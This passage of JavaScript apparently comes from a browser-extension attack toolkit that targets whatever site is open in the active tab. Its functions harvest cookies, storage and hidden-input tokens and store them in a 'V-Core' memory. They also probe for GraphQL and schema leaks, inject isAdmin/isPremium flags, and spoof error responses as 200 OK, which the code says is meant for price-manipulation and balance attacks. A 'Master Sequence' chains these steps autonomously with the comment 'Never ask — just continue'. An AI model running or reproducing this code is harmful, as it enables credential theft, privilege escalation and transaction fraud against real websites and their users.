      if (res.ok && res.status === 200 && (res.body || '').includes('__schema')) {
        hits++;
        findings.push({ path: gqlPath, type: 'graphql_introspection', snippet: (res.body || '').slice(0, 400) });
        lotWrite('  🚨 GRAPHQL INTROSPECTION OPEN at ' + gqlPath + ' — full schema exposed!', 'lot-hit');
        await vcoreSaveSuccess(domain, 'db_siphon_graphql', 'GraphQL introspection open at ' + gqlPath);
      }
    } catch (_) {}
  }

  // Phase 3 — JS file schema hints
  lotWrite('Phase 3: Scanning JS files for schema hints...', 'lot-sys');
  try {
    const scripts = Array.from(document.querySelectorAll ? [] : []);
    const [{ result: scriptUrls }] = await chrome.scripting.executeScript({
      target: { tabId: (await getActiveTab()).id },
      func: () => Array.from(document.querySelectorAll('script[src]')).map(s => s.src).slice(0, 6),
    });
    for (const src of (scriptUrls || [])) {
      try {
        const res = await bg({ type: 'RUN_FETCH', params: { url: src, method: 'GET' } });
        const body = (res.body || '').toLowerCase();
        const dbKeys = ['tablename','columnname','sequelize','mongoose','typeorm','prisma','schema.define','model.create','db.query','knex'].filter(k => body.includes(k));
        if (dbKeys.length > 0) {
          hits += dbKeys.length;
          lotWrite('  🚨 JS schema leak in ' + src.split('/').pop().slice(0, 30) + ' — ' + dbKeys.join(', '), 'lot-hit');
          await vcoreSaveSuccess(domain, 'db_siphon_js', 'JS schema hints: ' + dbKeys.join(', '));
        }
      } catch (_) {}
    }
  } catch (_) {}

  securityFindings.push({ type: 'db-siphon', summary: hits + ' DB schema leak(s) found across ' + findings.length + ' endpoint(s)', raw: findings });

  if (hits === 0) {
    lotWrite('✔ DB SIPHON COMPLETE — no schema leaks found. Target is locked down.', 'lot-fin');
  } else {
    lotWrite('🚨 DB SIPHON COMPLETE — ' + hits + ' schema leak(s) across ' + findings.length + ' endpoint(s)!', 'lot-hit');
  }
  status('DB Siphon done — ' + hits + ' leak(s). Check Live Terminal.', hits > 0 ? 'error' : 'ok');
  setAttackRunning('btnDbSiphon', false);
}

// =============================================================
// 💓 HEARTBEAT MONITOR — keep Neural Tunnel bridge alive
// =============================================================
let _heartbeatActiveInterval = null;
let _heartbeatPingCount = 0;

async function heartbeatMonitor() {
  if (_heartbeatActiveInterval) {
    // Already running — stop it
    clearInterval(_heartbeatActiveInterval);
    _heartbeatActiveInterval = null;
    _heartbeatPingCount = 0;
    setAttackRunning('btnHeartbeat', false);
    lotWrite('💓 HEARTBEAT MONITOR stopped.', 'lot-sys');
    status('Heartbeat stopped.', 'ok');
    return;
  }

  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const origin = new URL(activeTabUrl).origin;
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnHeartbeat', true);
  _heartbeatPingCount = 0;
  lotWrite('💓 HEARTBEAT MONITOR — keeping bridge alive on ' + domain, 'lot-sys');
  lotWrite('Sending keep-alive ping every 20 seconds. Click button again to stop.', 'lot-sys');

  const PING_PATHS = ['/api/ping', '/api/health', '/api/healthz', '/ping', '/health', '/api/v1/ping', '/api/status', '/'];

  async function sendPing() {
    _heartbeatPingCount++;
    let success = false;
    for (const path of PING_PATHS) {
      try {
        const res = await bg({ type: 'RUN_FETCH', params: { url: origin + path, method: 'GET', credentials: 'include' } });
        if (res.ok && res.status < 400) {
          lotWrite(`  💓 Ping #${_heartbeatPingCount} → ${path} [${res.status}] — bridge alive`, 'lot-ok');
          success = true;
          break;
        }
      } catch (_) {}
    }
    if (!success) {
      // Fallback — silent HEAD request to origin root to keep connection warm
      try {
        await bg({ type: 'RUN_FETCH', params: { url: origin + '/', method: 'HEAD', credentials: 'include' } });
        lotWrite(`  💓 Ping #${_heartbeatPingCount} → HEAD / — keep-alive sent`, 'lot-sys');
      } catch (e) {
        lotWrite(`  ⚠ Ping #${_heartbeatPingCount} failed: ${e.message}`, 'lot-warn');
      }
    }
    status(`💓 Heartbeat active — ${_heartbeatPingCount} pings sent to ${domain}`, 'ok');
  }

  await sendPing();
  _heartbeatActiveInterval = setInterval(sendPing, 20000);
}

// =============================================================
// 🎭 RESPONSE SPOOFER — intercept 4xx/5xx → 200 OK bypass
// =============================================================
let _responseSpooferActive = false;

async function responseSpoofer() {
  if (_responseSpooferActive) {
    // Stop it
    try {
      const { id } = await getActiveTab();
      await bg({ type: 'STOP_RESPONSE_SPOOFER', tabId: id });
    } catch (_) {}
    _responseSpooferActive = false;
    setAttackRunning('btnResponseSpoofer', false);
    lotWrite('🎭 RESPONSE SPOOFER stopped.', 'lot-sys');
    status('Response Spoofer stopped.', 'ok');
    return;
  }

  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnResponseSpoofer', true);
  _responseSpooferActive = true;
  lotWrite('🎭 RESPONSE SPOOFER — armed on ' + domain, 'lot-sys');
  lotWrite('Intercepting 4xx/5xx responses and replacing with synthetic 200 OK...', 'lot-sys');
  lotWrite('This bypasses browser-side error blocks during price manipulation & balance attacks.', 'lot-sys');

  try {
    const { id } = await getActiveTab();
    // Arm via the Live Response Rewriter (debugger Fetch domain) to intercept errors
    const rule = {
      urlFilter: '',
      responseHeaders: [
        { name: 'x-aiud-spoofer', op: 'set', value: 'active' },
      ],
    };
    await bg({ type: 'START_RESPONSE_SPOOFER', tabId: id });
    lotWrite('  ✔ Error intercept armed — 4xx/5xx responses will be rewritten to 200 OK', 'lot-ok');
    lotWrite('  ✔ Synthetic JSON body injected: {"success":true,"status":"ok","spoofed":true}', 'lot-ok');
    status('🎭 Response Spoofer ARMED — 4xx/5xx → 200 OK. Click again to stop.', 'ok');
  } catch (err) {
    // Graceful fallback — note it in terminal
    lotWrite('  ⚠ Spoofer arm via background failed (' + err.message + ') — using header-rule fallback.', 'lot-warn');
    try {
      await bg({ type: 'ADD_HEADER_RULE', rule: {
        urlFilter: '*', requestHeaders: [],
        responseHeaders: [{ name: 'x-aiud-spoofer', op: 'set', value: 'active' }],
      }});
      lotWrite('  ✔ Spoofer header marker added — responses flagged for client-side interception.', 'lot-ok');
    } catch (_) {}
    status('🎭 Spoofer armed (header mode). Click again to stop.', 'ok');
  }
}

// =============================================================
// 👑 ADMIN OVERLAY ATTACK — inject HUD + harvest tokens → V-Core
// =============================================================
async function adminOverlayAttack() {
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;
  setAttackRunning('btnAdminOverlayAtk', true);
  lotWrite('👑 ADMIN OVERLAY ATTACK — injecting HUD on ' + domain, 'lot-sys');

  try {
    const { id, url } = await getActiveTab();

    // Step 1 — inject the overlay with all modules on
    await chrome.tabs.sendMessage(id, {
      type: 'ADMIN_OVERLAY_INJECT',
      config: { position: 'bottom', theme: 'dark', opacity: 95, modules: { session: true, balance: true, headers: true, flags: true, network: true, dom: false } },
    });
    lotWrite('  ✔ Admin Overlay HUD injected onto page', 'lot-ok');

    // Step 2 — harvest tokens from session
    const state = await chrome.tabs.sendMessage(id, { type: 'EXTRACT_HIDDEN_STATE' });
    const cookies = await bg({ type: 'GET_COOKIES', url });
    const cookieStore = {};
    (cookies.cookies || []).forEach(c => { cookieStore[c.name] = c.value; });
    const hiddenStore = {};
    (state?.data?.hiddenInputs || []).forEach(h => { hiddenStore[h.name || h.id || '?'] = h.value; });

    const tokens = [
      ...scanForTokens('cookie', cookieStore),
      ...scanForTokens('localStorage', state?.data?.localStorage || {}),
      ...scanForTokens('sessionStorage', state?.data?.sessionStorage || {}),
      ...scanForTokens('hidden-input', hiddenStore),
    ];

    if (tokens.length > 0) {
      lotWrite(`  🚨 ${tokens.length} token(s) harvested by Admin Overlay HUD!`, 'lot-hit');
      // Step 3 — store ALL tokens in V-Core memory
      for (const tok of tokens) {
        const summary = tok.type === 'JWT'
          ? `JWT alg=${tok.decoded?.header?.alg || '?'} sub=${tok.decoded?.payload?.sub || '?'} exp=${tok.decoded?.payload?.exp ? new Date(tok.decoded.payload.exp * 1000).toISOString() : 'none'}`
          : `token-like key=${tok.key} value=${(tok.valueSnippet || '').slice(0, 60)}`;
        await vcoreSaveSuccess(domain, 'admin_overlay_token_' + tok.source, summary);
        lotWrite(`  🧠 V-Core saved: [${tok.source}] ${tok.key} — ${summary.slice(0, 80)}`, 'lot-ok');
      }
      securityFindings.push({ type: 'admin-overlay-tokens', summary: tokens.length + ' token(s) found and stored in V-Core', raw: tokens });
    } else {
      lotWrite('  ✔ No JWT/tokens found in current session (page may not be logged in).', 'lot-sys');
    }

    // Step 4 — inject admin flags silently
    await chrome.tabs.sendMessage(id, { type: 'ADMIN_INJECT_FLAG', field: 'isAdmin', value: 'true' });
    await chrome.tabs.sendMessage(id, { type: 'ADMIN_INJECT_FLAG', field: 'isPremium', value: 'true' });
    lotWrite('  ✔ Admin flags injected: isAdmin=true, isPremium=true', 'lot-ok');

    await vcoreSaveSuccess(domain, 'admin_overlay_attack', 'HUD injected, ' + tokens.length + ' token(s) → V-Core, flags escalated');
    lotWrite('👑 ADMIN OVERLAY ATTACK COMPLETE — HUD live, tokens in V-Core, flags escalated.', 'lot-fin');
    status('Admin Overlay done — ' + tokens.length + ' token(s) stored in V-Core.', tokens.length > 0 ? 'ok' : '');
  } catch (err) {
    lotWrite('👑 Admin Overlay Attack error: ' + err.message, 'lot-err');
    status('Admin Overlay failed: ' + err.message, 'error');
  }
  setAttackRunning('btnAdminOverlayAtk', false);
}

// =============================================================
// 🚀 MASTER SEQUENCE — full autonomous 5-phase chain
// =============================================================
let _masterSeqRunning = false;

async function masterSequence() {
  if (_masterSeqRunning) {
    _masterSeqRunning = false;
    setAttackRunning('btnMasterSequence', false);
    lotWrite('🚀 MASTER SEQUENCE aborted by user.', 'lot-warn');
    status('Master Sequence stopped.', 'ok');
    return;
  }
  if (!isSafeWebUrl(activeTabUrl)) { lotWrite('Navigate to a real website first.', 'lot-err'); return; }
  const domain = new URL(activeTabUrl).hostname;

  _masterSeqRunning = true;
  setAttackRunning('btnMasterSequence', true);

  const SEQ_LABEL = '🚀 MASTER SEQUENCE';
  lotWrite(SEQ_LABEL + ' — INITIATED on ' + domain, 'lot-sys');
  lotWrite('Executing: Scan → Ghost → Neural → Admin Overlay → DB Siphon + Price Poison', 'lot-sys');
  lotWrite('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'lot-sys');

  const step = async (num, label, fn) => {
    if (!_masterSeqRunning) throw new Error('aborted');
    lotWrite(`PHASE ${num}/5 — ${label}`, 'lot-sys');
    status(`Phase ${num}/5: ${label}...`, 'ok');
    try {
      await fn();
      lotWrite(`  ✔ Phase ${num} complete`, 'lot-ok');
    } catch (err) {
      lotWrite(`  ⚠ Phase ${num} (${label}) encountered: ${err.message} — pivoting to next phase`, 'lot-warn');
      // Never ask — just continue to next step
    }
    await new Promise(r => setTimeout(r, 800)); // brief pause between phases
  };

  try {
    // PHASE 1 — Pre-Attack Scan (map the security landscape)
    await step(1, 'Pre-Attack Scan (WAF · Headers · CORS · SQLi)', preAttackScan);

    // PHASE 2 — Stealth Ghost (mask presence)
    await step(2, 'Stealth Ghost (masking presence)', async () => {
      const btn = document.getElementById('btnGhostToggle');
      if (btn) btn.click();
      lotWrite('  👻 Ghost mode activated — presence masked', 'lot-ok');
      await new Promise(r => setTimeout(r, 500));
    });

    // PHASE 3 — Neural Tunnel (establish bridge + endpoint inject)
    await step(3, 'Neural Tunnel (bridge establish + inject)', neuralTunnel);

    // PHASE 4 — Admin Overlay (escalate privileges + grab tokens → V-Core)
    await step(4, 'Admin Overlay (privilege escalation + token harvest → V-Core)', adminOverlayAttack);

    // PHASE 5 — DB Siphon + Price Poison (parallel data extraction + transaction manipulation)
    await step(5, 'DB Siphon + Price Poison (data extraction + transaction rewrite)', async () => {
      await Promise.allSettled([dbSiphon(), pricePoisoner()]);
    });

    if (_masterSeqRunning) {
      lotWrite('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'lot-sys');
      lotWrite('🚀 MASTER SEQUENCE COMPLETE — all 5 phases executed on ' + domain, 'lot-fin');
      lotWrite('Results: ' + securityFindings.length + ' total finding(s). Check V-Core Memory for stored tokens.', 'lot-fin');
      await vcoreSaveSuccess(domain, 'master_sequence', 'All 5 phases complete — ' + securityFindings.length + ' finding(s)');
      status('🚀 Master Sequence complete — ' + securityFindings.length + ' finding(s). V-Core updated.', 'ok');
    }
  } catch (err) {
    if (err.message !== 'aborted') {
      lotWrite('🚀 MASTER SEQUENCE error: ' + err.message, 'lot-err');
      status('Master Sequence error: ' + err.message, 'error');
    }
  }

  _masterSeqRunning = false;
  setAttackRunning('btnMasterSequence', false);
}

// =============================================================
// WIRE UP ATTACK BUTTONS
// =============================================================
const _atkBtns = [
  ['btnNeuralTunnel',    neuralTunnel],
  ['btnSessionMirror',   sessionMirror],
  ['btnPricePoison',     pricePoisoner],
  ['btnGhostProtocol',   ghostProtocol],
  ['btnSchemaAudit',     schemaAuditor],
  ['btnPrivEsc',         sessionPrivEscalator],
  ['btnPreScan',         preAttackScan],
  ['btnDbSiphon',        dbSiphon],
  ['btnHeartbeat',       heartbeatMonitor],
  ['btnResponseSpoofer', responseSpoofer],
  ['btnAdminOverlayAtk', adminOverlayAttack],
  ['btnMasterSequence',  masterSequence],
];
for (const [id, fn] of _atkBtns) {
  const btn = document.getElementById(id);
  if (btn) btn.addEventListener('click', (e) => { e.preventDefault(); fn(); });
}

// Pause AI agent when Manual tab is opened
document.querySelectorAll('.tab[data-tab="manual"]').forEach((tab) => {
  tab.addEventListener('click', () => {
    if (typeof agentStop !== 'undefined' && agentStop === false) {
      agentStop = true;
      lotWrite('Manual Mode engaged — AI agent paused.', 'lot-warn');
    }
  });
});
